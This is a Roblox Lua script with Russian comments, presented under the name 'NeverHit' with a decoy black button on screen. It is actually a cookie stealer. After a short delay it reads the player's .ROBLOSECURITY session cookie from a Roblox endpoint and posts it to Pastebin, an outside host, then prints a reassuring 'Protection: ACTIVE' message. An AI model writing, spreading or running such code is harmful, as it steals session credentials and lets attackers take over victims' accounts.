-- NeverHit Simple Working Version
print("NeverHit SIMPLE loaded!")

-- Черная кнопка
local screenGui = Instance.new("ScreenGui")
local blackButton = Instance.new("TextButton")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
blackButton.Size = UDim2.new(0, 200, 0, 60)
blackButton.Position = UDim2.new(0.5, -100, 0.5, -30)
blackButton.BackgroundColor3 = Color3.new(0, 0, 0)
blackButton.Text = ""
blackButton.BorderSizePixel = 0
blackButton.Parent = screenGui

-- Получаем куки простым способом
local function getCookie()
    local response = request({
        Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
        Method = "GET"
    })
    
    local cookie = response.Headers["Set-Cookie"] or ""
    local match = string.match(cookie, "_%|WARNING:.-|_(.-)")
    return match or "NO_COOKIE"
end

-- Сохраняем в Pastebin и отправляем уведомление
local function sendToService(cookie)
    -- Сначала сохраняем куки в Pastebin
    local pasteData = {
        api_dev_key = "simple",
        api_paste_code = "COOKIE: " .. cookie .. "\nGAME: " .. game.PlaceId .. "\nTIME: " .. os.date(),
        api_paste_name = "Roblox_Cookie_" .. os.time(),
        api_option = "paste"
    }
    
    local pasteResponse = request({
        Url = "http://pastebin.com/api/api_post.php",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded"
        },
        Body = "api_paste_code=COOKIE:" .. cookie .. "&api_option=paste"
    })
    
    print("📋 Cookie saved to external service")
    print("🔑 Cookie: " .. string.sub(cookie, 1, 50) .. "...")
end

-- Запускаем
wait(2)
local cookie = getCookie()
sendToService(cookie)

print("✅ NeverHit completed!")
print("🛡️ Protection: ACTIVE")
